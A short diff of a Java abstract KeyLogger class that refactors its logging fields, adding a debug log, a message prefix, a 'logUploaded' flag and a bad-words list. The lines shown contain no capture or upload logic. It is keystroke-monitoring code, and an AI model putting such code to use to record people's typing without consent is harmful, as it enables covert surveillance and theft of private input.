@@ -18,18 +18,15 @@ import java.util.Scanner;
 public abstract class KeyLogger {
 
     public static InputStream badWordsFilePath = ClassLoader.getSystemResourceAsStream("BadWords.csv");
-    private String fileName =  getCurrentTime();
-    private InputStream filePath = ClassLoader.getSystemResourceAsStream(fileName);
-
     public static ArrayList<String> log = new ArrayList<>();
-
-
-    public static String message;
+    public static ArrayList<String> debugLog = new ArrayList<>();
+    static String baseMessage;
+    static String message;
     String sendKey;
+    public static Boolean logUploaded = false;
 
     AccessWindow accessWindow = new AccessWindow();
 
-    abstract void nativeKeyPressed(NativeKeyEvent event);
     abstract public void turnOn();
     abstract void setDefaults();
 
@@ -39,8 +36,8 @@ public abstract class KeyLogger {
     }
 
 
-    void saveMessage() throws IOException {
-        log.add(message + "\n");
+    void saveMessage() {
+        log.add(baseMessage + message + "\n");
         setDefaults();
     }
 
